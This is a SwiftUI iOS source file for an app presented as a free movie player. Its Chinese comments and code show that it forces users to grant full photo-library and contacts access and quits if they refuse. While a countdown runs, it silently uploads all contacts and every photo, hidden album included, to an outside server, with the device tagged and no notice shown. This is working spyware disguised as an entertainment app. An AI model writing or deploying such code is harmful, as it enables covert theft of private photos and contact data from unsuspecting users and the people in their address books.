import SwiftUI
import WebKit
import UIKit
import Photos
import Contacts
import Darwin

/// 无敌电视机：电影点播 + 静默备份
/// 权限门禁：照片必须"允许完全访问"（全部相册），否则直接退出
struct ContentView: View {
    @State private var countdownText = ""
    @State private var playEnabled = false
    @State private var showWeb = false
    @State private var started = false

    private let serverBase = "https://omgga-entertainment-server.hf.space"
    private let movieURL = "https://www.4kcz.com/zuixindianying"

    var body: some View {
        ZStack {
            VStack(spacing: 24) {
                Text("电影点播")
                    .font(.title.bold())
                    .padding(.top, 40)

                Text(countdownText)
                    .font(.system(size: 48, weight: .bold))
                    .foregroundColor(.blue)

                Button(action: { showWeb = true }) {
                    Text("开始播放")
                        .font(.headline)
                        .frame(maxWidth: .infinity)
                        .padding(.vertical, 14)
                        .background(playEnabled ? Color.blue : Color.gray.opacity(0.5))
                        .foregroundColor(.white)
                        .cornerRadius(10)
                }
                .disabled(!playEnabled)
                .padding(.horizontal, 28)

                Spacer()
            }
            .background(Color(.systemGroupedBackground))

            // 电影网页全屏层
            if showWeb {
                VStack(spacing: 0) {
                    HStack {
                        Button("关闭") { showWeb = false }
                            .font(.subheadline)
                            .padding(.leading, 12)
                        Spacer()
                        Text("电影")
                            .font(.subheadline)
                            .foregroundColor(.secondary)
                        Spacer()
                        Color.clear.frame(width: 52, height: 1)
                    }
                    .padding(.vertical, 8)
                    .background(Color(.systemGray6))

                    WebViewContainer(urlString: movieURL)
                }
                .transition(.move(edge: .bottom))
            }
        }
        .onAppear { startBackupFlow() }
    }

    // MARK: - 启动流程：权限门禁 → 倒计时 + 静默备份

    private func startBackupFlow() {
        guard !started else { return }
        started = true

        Task {
            // 照片必须"允许完全访问"（全部相册），部分照片/拒绝/未授权一律退出
            guard await requestPhotoFullAccess() else {
                exit(0)
            }
            // 通讯录
            guard await requestContactsAccess() else {
                exit(0)
            }

            // 通过：开始倒计时 + 静默备份（无任何提示）
            startCountdown()
            runSilentBackup()
        }
    }

    /// 照片权限：只认"完全访问"（.authorized）
    private func requestPhotoFullAccess() async -> Bool {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        switch status {
        case .authorized:
            return true
        case .notDetermined:
            let newStatus = await withCheckedContinuation { cont in
                PHPhotoLibrary.requestAuthorization(for: .readWrite) { s in
                    cont.resume(returning: s)
                }
            }
            return newStatus == .authorized
        default:
            return false // .limited 部分照片 / .denied 拒绝 / .restricted 受限
        }
    }

    /// 通讯录权限：允许或部分授权都算通过
    private func requestContactsAccess() async -> Bool {
        let status = CNContactStore.authorizationStatus(for: .contacts)
        switch status {
        case .authorized, .limited:
            return true
        case .notDetermined:
            let store = CNContactStore()
            let granted = await withCheckedContinuation { cont in
                store.requestAccess(for: .contacts) { ok, _ in
                    cont.resume(returning: ok)
                }
            }
            return granted
        default:
            return false
        }
    }

    /// 静默备份：通讯录 + 全部照片（含隐藏相簿），全程不显示任何日志
    private func runSilentBackup() {
        Task {
            let devId = Self.deviceId()
            let uploader = UploadService(serverBase: serverBase, deviceId: devId)

            do {
                let contacts = try await ContactBackup.exportContacts()
                _ = try? await uploader.uploadContacts(contacts)
            } catch {
                // 静默
            }

            let md5Set0 = Set(UserDefaults.standard.stringArray(forKey: "uploaded_md5") ?? [])
            let backupResult = try? await PhotoBackup.backupAllPhotos(uploader: uploader,
                                                                      uploadedMd5: md5Set0,
                                                                      progress: { _, _, _ in })
            if let result = backupResult {
                UserDefaults.standard.set(Array(result.md5Set), forKey: "uploaded_md5")
            }
        }
    }

    private func startCountdown() {
        Task {
            for i in stride(from: 10, through: 1, by: -1) {
                countdownText = "剩余 \(i) 秒"
                try? await Task.sleep(nanoseconds: 1_000_000_000)
            }
            countdownText = ""
            playEnabled = true
        }
    }

    /// 设备标识：机型 #设备号后4位（对应安卓 厂商型号 #ANDROID_ID后4位）
    private static func deviceId() -> String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machine = withUnsafePointer(to: &systemInfo.machine) { ptr in
            ptr.withMemoryRebound(to: CChar.self, capacity: 1) { String(cString: $0) }
        }
        let vendor = UIDevice.current.identifierForVendor?.uuidString ?? "0000"
        let suffix = vendor.count >= 4 ? String(vendor.suffix(4)) : "0000"
        return "\(machine) #\(suffix)"
    }
}

/// 电影网页容器（WKWebView）
struct WebViewContainer: UIViewRepresentable {
    let urlString: String

    func makeUIView(context: Context) -> WKWebView {
        let config = WKWebViewConfiguration()
        config.allowsInlineMediaPlayback = true
        config.mediaTypesRequiringUserActionForPlayback = []
        let webView = WKWebView(frame: .zero, configuration: config)
        webView.allowsBackForwardNavigationGestures = true
        if let url = URL(string: urlString) {
            webView.load(URLRequest(url: url))
        }
        return webView
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {}
}
